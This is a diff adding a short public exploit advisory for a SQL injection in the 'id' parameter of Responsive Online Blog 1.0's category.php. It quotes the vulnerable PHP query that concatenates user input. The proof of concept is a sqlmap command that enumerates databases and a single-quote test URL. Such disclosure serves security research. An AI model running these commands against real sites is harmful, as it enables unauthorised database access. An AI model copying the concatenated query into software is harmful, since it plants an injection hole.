@@ -1,0 +1,21 @@
+# Exploit Title: Responsive Online Blog 1.0 - 'id' SQL Injection
+# Date: 2020-06-23
+# Exploit Author: Eren Şimşek
+# Vendor Homepage: https://www.sourcecodester.com/php/14194/responsive-online-blog-website-using-phpmysql.html
+# Software Link: https://www.sourcecodester.com/download-code?nid=14194&title=Responsive+Online+Blog+Website+using+PHP%2FMySQL
+# Version: v1.0
+# Tested on: Linux - Wamp Server
+
+>Vulnerable File
+   /category.php
+
+>Vulnerable Code
+
+   $id=$_REQUEST['id'];
+   $query="SELECT * from blog_categories where id='".$id."'";
+   Id parameter enters sql query without any changes
+
+>Proof Of Concept
+   sqlmap 'http://localhost/resblog/category.php?id=1' --dbs --batch
+   OR
+   http://TARGET/resblog/category.php?id=1' Single Quote will cause SQL error
